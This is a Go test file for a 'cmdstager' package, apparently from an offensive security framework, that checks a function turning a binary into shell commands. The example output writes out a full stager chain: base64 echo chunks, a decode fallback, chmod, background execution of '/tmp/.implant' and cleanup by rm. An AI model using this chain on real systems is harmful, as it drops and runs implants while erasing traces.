package cmdstager

import (
	"encoding/base64"
	"fmt"
	"strings"
	"testing"
)

func TestBourneChunking(t *testing.T) {
	binary := make([]byte, 256)
	for i := range binary {
		binary[i] = byte(i)
	}

	opts := Options{TempPath: "/tmp/.test", LineMax: 100}
	commands := Bourne(binary, opts)

	// Must have echo chunks + decode + chmod + exec + rm = at least 5 commands
	if len(commands) < 5 {
		t.Fatalf("expected at least 5 commands, got %d", len(commands))
	}

	// All echo commands must respect LineMax
	for i, cmd := range commands {
		if strings.HasPrefix(cmd, "echo -n ") && len(cmd) > opts.LineMax {
			t.Errorf("chunk %d exceeds LineMax: %d > %d", i, len(cmd), opts.LineMax)
		}
	}
}

func TestBourneRoundTrip(t *testing.T) {
	binary := []byte{0x7f, 'E', 'L', 'F', 0x02, 0x01, 0x00, 0xff}

	opts := Options{TempPath: "/tmp/.test", LineMax: 2047}
	commands := Bourne(binary, opts)

	// Reconstruct the base64 from echo chunks
	var b64Data strings.Builder
	for _, cmd := range commands {
		if !strings.HasPrefix(cmd, "echo -n '") {
			continue
		}
		start := len("echo -n '")
		end := strings.Index(cmd, "'>>")
		if end < 0 {
			t.Fatalf("malformed echo command: %s", cmd)
		}
		b64Data.WriteString(cmd[start:end])
	}

	decoded, err := base64.StdEncoding.DecodeString(b64Data.String())
	if err != nil {
		t.Fatalf("base64 decode failed: %v", err)
	}
	if string(decoded) != string(binary) {
		t.Errorf("round-trip failed: got %v, want %v", decoded, binary)
	}
}

func TestBourneFinalCommands(t *testing.T) {
	commands := Bourne([]byte{0x41}, Options{TempPath: "/tmp/.test"})

	n := len(commands)
	if n < 4 {
		t.Fatalf("expected at least 4 commands, got %d", n)
	}

	// decode, chmod, exec, rm
	if !strings.Contains(commands[n-4], "base64") {
		t.Errorf("expected decode chain, got %q", commands[n-4])
	}
	if commands[n-3] != "chmod +x /tmp/.test" {
		t.Errorf("expected chmod, got %q", commands[n-3])
	}
	if commands[n-2] != "/tmp/.test &" {
		t.Errorf("expected exec, got %q", commands[n-2])
	}
	if commands[n-1] != "rm -f /tmp/.test /tmp/.test.b64" {
		t.Errorf("expected cleanup, got %q", commands[n-1])
	}
}

func TestBourneEmpty(t *testing.T) {
	commands := Bourne(nil, Options{TempPath: "/tmp/.test"})
	// Empty base64 still produces one echo chunk + decode + chmod + exec + rm
	if len(commands) < 4 {
		t.Errorf("expected at least 4 commands for empty binary, got %d", len(commands))
	}
}

func ExampleBourne() {
	binary := []byte{0x7f, 'E', 'L', 'F'}
	commands := Bourne(binary, Options{TempPath: "/tmp/.implant", LineMax: 2047})
	for _, cmd := range commands {
		fmt.Println(cmd)
	}
	// Output:
	// echo -n 'f0VMRg=='>>/tmp/.implant.b64
	// ((which base64 >&2 && base64 -d) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2>/dev/null >/tmp/.implant </tmp/.implant.b64
	// chmod +x /tmp/.implant
	// /tmp/.implant &
	// rm -f /tmp/.implant /tmp/.implant.b64
}
